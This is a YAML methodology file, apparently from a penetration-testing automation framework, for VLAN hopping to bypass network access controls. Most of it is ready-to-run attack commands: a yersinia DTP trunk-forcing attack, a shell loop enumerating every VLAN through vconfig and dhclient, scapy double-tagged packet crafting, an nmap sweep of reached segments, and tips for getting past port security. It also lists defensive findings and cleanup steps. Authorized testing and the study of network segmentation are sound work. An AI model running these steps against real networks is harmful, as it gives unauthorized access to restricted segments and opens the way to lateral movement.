id: vlan_hopping
name: VLAN Hopping
category: NAC Bypass
priority: high
description: Exploit VLAN misconfigurations to access restricted network segments.
detailed_description: |
  Exploit VLAN misconfigurations through DTP manipulation or double-tagging attacks
  to gain unauthorized access to restricted VLANs and network segments.

required_conditions:
  - network_access
  - vlans_present

optional_conditions:
  - dtp_enabled
  - native_vlan_misconfigured
  - trunk_port_access

tools:
  - name: yersinia
    description: Network attack tool with DTP support
    platform: linux
  - name: scapy
    description: Packet manipulation library
    platform: python
  - name: vconfig
    description: VLAN configuration utility
    platform: linux

phases:
  - name: reconnaissance
    steps:
      - id: detect_vlans
        action: Detect VLANs on network
        command: |
          # Passive VLAN detection
          sudo tcpdump -i {interface_name} -nn -e vlan
        output_variables:
          - detected_vlans
          - native_vlan

      - id: check_dtp
        action: Check if DTP is enabled
        command: |
          # Listen for DTP frames
          sudo tcpdump -i {interface_name} -nn -v -s 1500 -c 10 'ether[20:2] == 0x2004'

      - id: identify_trunk_native
        action: Identify native VLAN
        command: |
          # Native VLAN frames are untagged
          # Compare tagged vs untagged traffic

  - name: dtp_exploitation
    steps:
      - id: force_trunk_mode
        action: Force trunk mode using DTP
        command: sudo yersinia dtp -attack 1 -interface {interface_name}
        alternatives:
          - shell: gui
            command: sudo yersinia -G
        caution: May trigger alerts

      - id: enumerate_vlans_trunk
        action: Enumerate accessible VLANs
        command: |
          for vlan in {1..4096}; do
            sudo vconfig add {interface_name} $vlan 2>/dev/null
            sudo ifconfig {interface_name}.$vlan up 2>/dev/null
            timeout 2 sudo dhclient {interface_name}.$vlan 2>/dev/null
            if [ $? -eq 0 ]; then
              echo "VLAN $vlan is accessible"
            fi
          done

  - name: double_tagging
    steps:
      - id: craft_double_tagged_packet
        action: Create double-tagged packet
        command: |
          python3 << EOF
          from scapy.all import *
          # Outer tag = native VLAN (will be stripped)
          # Inner tag = target VLAN
          packet = Ether()/Dot1Q(vlan={native_vlan})/Dot1Q(vlan={target_vlan})/IP(dst="{target_ip}")/ICMP()
          sendp(packet, iface="{interface_name}")
          EOF

      - id: test_vlan_access
        action: Test access to target VLAN
        command: |
          # Send multiple packets to increase success
          for i in {1..10}; do
            python3 -c "from scapy.all import *; sendp(Ether()/Dot1Q(vlan={native_vlan})/Dot1Q(vlan={target_vlan})/IP(dst='{target_ip}')/ICMP(), iface='{interface_name}')"
          done

  - name: manual_vlan_hopping
    steps:
      - id: load_8021q_module
        action: Load 802.1Q kernel module
        command: sudo modprobe 8021q

      - id: add_vlan_interface
        action: Add VLAN interface
        command: |
          sudo vconfig add {interface_name} {target_vlan}
          sudo ifconfig {interface_name}.{target_vlan} up

      - id: obtain_vlan_ip
        action: Obtain IP on target VLAN
        command: sudo dhclient {interface_name}.{target_vlan}
        alternatives:
          - shell: static
            command: sudo ip addr add {vlan_ip}/{subnet} dev {interface_name}.{target_vlan}

      - id: scan_vlan_network
        action: Scan VLAN for hosts
        command: nmap -sn {vlan_subnet}

triggers:
  on_complete:
    - methodology: network_discovery
      condition: new_vlan_accessed
    - methodology: lateral_movement
      condition: restricted_segment_reached

findings:
  - id: dtp_enabled_access_port
    title: DTP Enabled on Access Ports
    severity: high
    description: Dynamic Trunking Protocol allows unauthorized trunk negotiation

  - id: native_vlan_misconfigured
    title: Native VLAN Misconfiguration
    severity: high
    description: Native VLAN allows double-tagging attacks

  - id: no_vlan_acls
    title: Lack of VLAN ACLs
    severity: medium
    description: No access control lists between VLANs

  - id: trunk_exposed
    title: Trunk Ports Exposed
    severity: critical
    description: Trunk ports accessible to end users

issues:
  - symptom: DTP frames not observed
    severity: low
    causes:
      - DTP disabled on switch
      - Not a Cisco switch
      - Port hardened
    resolutions:
      - Try double-tagging attack
      - Manual VLAN enumeration
      - Focus on other vectors

  - symptom: VLAN hopping blocked
    severity: medium
    causes:
      - VLAN ACLs configured
      - Private VLANs in use
      - Proper segmentation
    resolutions:
      - Try different VLANs
      - Look for misconfigurations
      - Attempt routing attacks

  - symptom: CAM table overflow detected
    severity: high
    causes:
      - Port security triggered
      - Switch protecting against attack
    resolutions:
      - Reduce enumeration speed
      - Target specific VLANs
      - Use passive detection

cleanup:
  - priority: high
    action: Remove VLAN interfaces
    command: |
      for vlan in $(ls /proc/net/vlan/ | grep {interface_name}); do
        sudo vconfig rem $vlan
      done

  - priority: medium
    action: Reset interface configuration
    command: |
      sudo ip addr flush dev {interface_name}
      sudo dhclient {interface_name}

  - priority: low
    action: Unload 802.1Q module
    command: sudo rmmod 8021q

outcome_analysis:
  success_indicators:
    - Access to multiple VLANs
    - Trunk mode negotiated
    - Can reach restricted segments
    - New subnets discovered

  failure_indicators:
    - DTP disabled
    - VLANs properly segmented
    - Port security triggered
    - No misconfigurations found